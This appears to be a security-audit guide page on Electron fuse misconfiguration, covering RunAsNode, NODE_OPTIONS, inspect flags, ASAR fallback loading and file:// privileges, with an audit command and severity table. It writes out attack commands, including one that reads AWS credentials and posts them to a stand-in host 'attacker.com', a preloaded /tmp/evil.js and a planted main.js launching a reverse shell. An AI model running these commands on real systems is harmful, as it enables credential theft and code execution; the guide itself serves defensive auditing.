---
title: Fuse Misconfiguration
description: Security risks from improperly configured Electron fuses — RunAsNode, NodeOptions, and other binary-level flags
---

# Fuse Misconfiguration

Most Electron apps ship with dangerous fuses at their defaults — which are almost universally "enabled" for the dangerous ones. This isn't negligence; it's that fuse tooling was introduced relatively recently and teams don't go back to retrofit it. Running the fuse audit command takes five seconds. Finding bugs from it takes almost as long.

The core pattern: fuses enabled by default that should be disabled create attack vectors for anyone who can control environment variables or command-line arguments of the app's process.

---

## RunAsNode Enabled

The `RunAsNode` fuse lets you use the Electron binary as a Node.js interpreter by setting `ELECTRON_RUN_AS_NODE=1`:

```bash
# Arbitrary code execution using the app's identity:
ELECTRON_RUN_AS_NODE=1 /Applications/Target.app/Contents/MacOS/Target \
  -e "require('child_process').exec('open -a Calculator')"

# Exfiltrate AWS credentials:
ELECTRON_RUN_AS_NODE=1 /Applications/Target.app/Contents/MacOS/Target -e "
const data = require('fs').readFileSync('/home/user/.aws/credentials', 'utf8');
require('https').request({hostname:'attacker.com',path:'/c',method:'POST'}).write(data);
"
```

**When is this reachable?**
- Attacker has local access and can set environment variables
- App runs in a container or CI environment where env can be injected
- Parent process compromise → env injection into child app launch
- App is spawned by another process that passes env from a configuration file

If the app runs with elevated privileges (SYSTEM, root, admin), `ELECTRON_RUN_AS_NODE` makes it a privilege escalation vector for anyone who can set env vars in its launch context.

---

## EnableNodeOptionsEnvironmentVariable Enabled

`NODE_OPTIONS` controls Node.js runtime behavior. When this fuse is on, it applies to the Electron main process:

```bash
# Code loads before any app code:
NODE_OPTIONS="--require /tmp/evil.js" /path/to/electron-app

# /tmp/evil.js runs in the main process context — full Node.js access:
# require('child_process').exec('...'), fs.readFileSync, require('net'), etc.

# Open debugger (alternative to --inspect flag):
NODE_OPTIONS="--inspect=9229" /path/to/electron-app
```

Any attacker who can influence the environment when the app launches gets pre-startup code execution in the main process.

---

## EnableNodeCliInspectArguments Enabled

`--inspect` and `--inspect-brk` CLI flags open a debugging port:

```bash
/path/to/electron-app --inspect=9229
# → Chrome DevTools remote debugging available at localhost:9229
# → chrome://inspect → Connect → full Node.js REPL in main process context
# → Can read files, execute commands, inspect memory

/path/to/electron-app --inspect-brk=9229
# → App pauses before executing any code — debugger must connect first
```

CVE-2018-1000006 used this exact mechanism: Electron's protocol handler registration on Windows put the URL (attacker-controlled) into the command line, Electron parsed it as flags, debugger opened.

---

## OnlyLoadAppFromAsar Disabled

Without this fuse, Electron falls back to loading from an `app/` directory when `app.asar` is missing or renamed:

```bash
# No need to modify app.asar — just rename it and create a directory:
mv /opt/app/resources/app.asar /opt/app/resources/app.asar.bak
mkdir -p /opt/app/resources/app/
echo '{"main":"main.js","name":"app"}' > /opt/app/resources/app/package.json
echo "require('child_process').exec('reverse_shell.sh')" > /opt/app/resources/app/main.js
# Next launch: Electron finds no app.asar, loads attacker's directory
```

---

## GrantFileProtocolExtraPrivileges Enabled

Pages loaded via `file://` get elevated trust by default — they can access Node.js modules and have permissions that web-origin pages don't get. If an attacker can cause the app to load a local HTML file via path traversal or symlink, that page gets elevated capabilities.

---

## The Quick Audit

```bash
npx @electron/fuses read --app /path/to/app 2>&1 | \
  grep -E "RunAsNode|NodeOptions|CliInspect|OnlyLoad|FileProtocol|CookieEncrypt" | \
  sed 's/is Enabled/is Enabled  ← RISK/g; s/is Disabled/is Disabled ← OK/g'
```

---

## Severity Reference

| Fuse enabled | Risk | Exploit scenario |
|-------------|------|-----------------|
| RunAsNode | High | `ELECTRON_RUN_AS_NODE=1 app -e "exec()"` |
| NodeOptions | High | `NODE_OPTIONS=--require /tmp/evil.js app` |
| NodeCliInspect | High | `app --inspect=9229` → main process REPL |
| OnlyLoadAppFromAsar missing | Medium | Rename ASAR + create malicious directory |
| GrantFileProtocolExtraPrivileges | Medium | Elevated file:// access from path traversal |
| CookieEncryption missing | Medium | Session cookies readable from disk |

When multiple bad fuses combine — RunAsNode enabled, no ASAR integrity, app runs elevated — the cumulative impact is Critical.
